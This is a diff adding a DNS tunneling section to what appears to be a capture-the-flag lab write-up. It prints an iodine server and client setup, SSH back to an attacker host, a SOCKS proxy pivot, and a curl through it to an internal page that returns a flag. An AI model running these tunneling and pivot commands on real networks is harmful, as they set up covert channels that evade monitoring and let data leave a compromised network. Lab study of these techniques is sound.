@@ -311,3 +311,55 @@ THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}
 
 ## DNS Tunneling
 
+```Bash
+thm@attacker:~$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com  
+[sudo] password for <USER>****
+Opened dns0
+Setting IP of dns0 to <IP ADDRESS>
+Setting MTU of dns0 to 1130
+Opened IPv4 UDP socket
+Listening to dns for domain att.tunnel.com
+```
+
+```Bash
+thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
+[sudo] password for <USER>: 
+Opened dns0
+Opened IPv4 UDP socket
+Sending DNS queries for att.tunnel.com to 127.0.0.11
+Autodetecting DNS query type (use -T to override).
+Using DNS type NULL queries
+Version ok, both using protocol v 0x00000502. You are user #0
+Setting IP of dns0 to 172.20.0.200	
+Setting MTU of dns0 to 1130
+Server tunnel IP is 172.20.0.200	
+Testing raw UDP data to the server (skip with -r)
+Server is at <MACHINE IP>, trying raw login: OK
+Sending raw traffic directly to 172.20.0.200	
+Connection setup complete, transmitting data.
+Detaching from terminal...
+```
+
+```Bash
+thm@jump-box:~$ ssh thm@172.20.0.200
+thm@172.20.0.200's password:
+[...]
+thm@attacker:~$
+```
+
+```Bash
+thm@attacker:~$ ssh thm@10.1.1.2 -4 -f -N -D 1080
+The authenticity of host '10.1.1.2 (10.1.1.2)' can't be established.
+ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.1.1.2' (ECDSA) to the list of known hosts.
+thm@10.1.1.2's password:
+thm@attacker:~$ 
+```
+
+```Bash
+thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php
+
+<p>THM{DN5-Tunn311n9-1s-c00l}</p>
+```
+
